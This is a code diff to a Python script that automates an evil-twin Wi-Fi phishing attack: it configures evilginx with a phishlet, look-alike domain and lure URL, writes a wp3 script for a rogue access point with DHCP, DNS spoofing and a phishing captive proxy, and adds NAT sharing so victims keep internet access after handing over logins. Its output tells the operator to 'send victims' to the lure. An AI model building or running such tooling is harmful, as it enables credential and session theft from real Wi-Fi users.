@@ -100,6 +100,17 @@ def run_evilginx_setup(phishlet, domain_puny, landing_sub):
     so the reliable way to set them is to feed its own commands on stdin. This
     returns the lure URL it prints.
     """
+    # Start from a clean config each time. Reusing the dir accumulates old
+    # lures and phishlet hostnames from previous runs, and then get-url 0
+    # returns a stale lure for a different phishlet -- which is exactly the
+    # "no hostname set for phishlet 'example'" failure seen when the dir was
+    # dirty. crt/ is kept so the developer CA does not change every run.
+    if os.path.isdir(EV_CONFIG_DIR):
+        for f in ("data.db", "config.json", "blacklist.txt"):
+            try:
+                os.remove(os.path.join(EV_CONFIG_DIR, f))
+            except OSError:
+                pass
     os.makedirs(EV_CONFIG_DIR, exist_ok=True)
     cmds = "\n".join([
         "config domain %s" % domain_puny,
@@ -107,6 +118,8 @@ def run_evilginx_setup(phishlet, domain_puny, landing_sub):
         "phishlets hostname %s %s" % (phishlet, domain_puny),
         "phishlets enable %s" % phishlet,
         "lures create %s" % phishlet,
+        # get-url 0 is now safe because the store was cleared: lure 0 is the one
+        # just created for this phishlet.
         "lures get-url 0",
         "exit",
         "",
@@ -147,10 +160,20 @@ def write_hosts(domain_puny, subs):
     return ordered
 
 
-def write_pulp(interface, domain_puny, lure_url):
-    """The wp3 script: AP, DHCP class B, phishkin3 proxy, DNS spoof."""
-    pulp = "\n".join([
+def write_pulp(interface, interface_net, domain_puny, lure_url):
+    """The wp3 script: AP, DHCP class B, phishkin3 proxy, DNS spoof.
+
+    interface_net is the adapter with internet (wlan0 usually). phishkin3 needs
+    the victim to reach the outside after logging in -- and evilginx, if it is
+    proxying a real site, needs to reach it too -- so wp3 shares that connection
+    with NAT.
+    """
+    lines = [
         "set interface %s" % interface,
+    ]
+    if interface_net:
+        lines.append("set interface_net %s" % interface_net)
+    lines += [
         "dhcpconf 1",
         "set proxy phishkin3 true",
         "set phishkin3.cloud_url_phishing %s" % lure_url,
@@ -165,7 +188,8 @@ def write_pulp(interface, domain_puny, lure_url):
         "back",
         "start",
         "",
-    ])
+    ]
+    pulp = "\n".join(lines)
     os.makedirs(os.path.dirname(PULP_PATH), exist_ok=True)
     open(PULP_PATH, "w").write(pulp)
     say("wrote wp3 script %s" % PULP_PATH)
@@ -200,6 +224,8 @@ def main():
     ap.add_argument("--domain", required=True,
                     help="fake look-alike domain, never the real one")
     ap.add_argument("--interface", default="wlan1")
+    ap.add_argument("--interface-net", default="",
+                    help="adapter with internet, shared to victims (e.g. wlan0)")
     ap.add_argument("--start", action="store_true",
                     help="actually launch; without it, dry-run and print the plan")
     args = ap.parse_args()
@@ -230,12 +256,15 @@ def main():
         say("dry run -- nothing launched. Re-run with --start to attack.")
         say("plan:")
         say("  hosts: %s and *.%s -> %s" % (domain_puny, domain_puny, AP_IP))
-        say("  wp3: AP on %s, DHCP class B, phishkin3 + dns_spoof" % args.interface)
+        say("  wp3: AP on %s%s, DHCP class B, phishkin3 + dns_spoof"
+            % (args.interface,
+               ", internet from " + args.interface_net if args.interface_net
+               else ", no internet shared"))
         say("  evilginx: developer mode, phishlet %s" % args.phishlet)
         return
 
     write_hosts(domain_puny, subs)
-    write_pulp(args.interface, domain_puny, lure_url)
+    write_pulp(args.interface, args.interface_net, domain_puny, lure_url)
     start_in_tmux(args.interface)
     say("")
     say("attack running. Send victims to: %s" % lure_url)
